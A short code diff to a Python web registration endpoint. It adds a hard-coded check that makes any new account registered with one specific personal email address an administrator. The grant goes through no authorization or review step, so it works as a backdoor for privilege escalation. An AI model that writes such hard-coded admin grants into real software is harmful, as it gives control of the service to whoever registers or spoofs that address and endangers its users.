@@ -19,6 +19,9 @@ def register(data: RegisterIn, db: Session = Depends(get_db)):
     if db.scalar(select(User).where(User.email == email)):
         raise HTTPException(400, "This email is already registered")
     user = User(email=email, password_hash=hash_password(data.password))
+    # Automatically make this specific email an admin
+    if email == "abdulraheemoyetade26@gmail.com":
+        user.is_admin = True
     db.add(user)
     db.commit()
     db.refresh(user)
